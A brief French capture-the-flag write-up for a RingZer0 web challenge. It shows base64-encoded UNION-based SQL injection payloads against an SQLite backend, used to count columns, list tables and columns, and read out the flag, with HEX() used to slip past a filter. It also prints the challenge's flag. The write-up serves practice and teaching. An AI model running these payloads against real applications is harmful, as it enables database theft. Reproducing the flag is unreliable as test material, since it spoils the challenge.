Il faut convertir en base64 l'injection sql dans l'url.

en mettant un id vide:
http://challenges.ringzer0ctf.com:10040/?id=

Je reçois un message:
SQLite Database error please try again later.

Donc c'est une BD SQLite
Puis en plus on a un hint sur la page principal donc c'est relativement facile.

On peut trouver le nombre de colonnes qui est de 3 avec
1) UNION SELECT NULL, NULL, NULL -- 
qui converti sous forme base64 donne ceci 
http://challenges.ringzer0ctf.com:10040/?id=MSkgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwgLS0g

En essayant des UNION SELECT sur des nombres ca fonctionne mais pas des lettres donc je vais utiliser la méthode HEX()
pour convertir les lettres en hexadécimal.


Avec les BD SQLite on peut trouver le nom des tables comme ça:
SELECT name FROM sqlite_schema WHERE type='table' donc on peut faire
1) UNION SELECT HEX(name), NULL, NULL FROM sqlite_master WHERE type='table' -- 

Ca retourne : 666C6167 ce qui équivaut à flag
Il existe donc une table flag
Je vais chercher le nom des colonnes de cette table

1) UNION SELECT HEX(name), NULL, NULL FROM pragma_table_info('flag') -- 
Ca me retourne : 636F6E74656E74 qui équivaut à content

1) UNION SELECT HEX(content), NULL, NULL FROM flag -- 
Ca me retourne : 464C41472D735146597A716678625A68416A30344E7943435638747141 qui équivaut à FLAG-sQFYzqfxbZhAj04NyCCV8tqA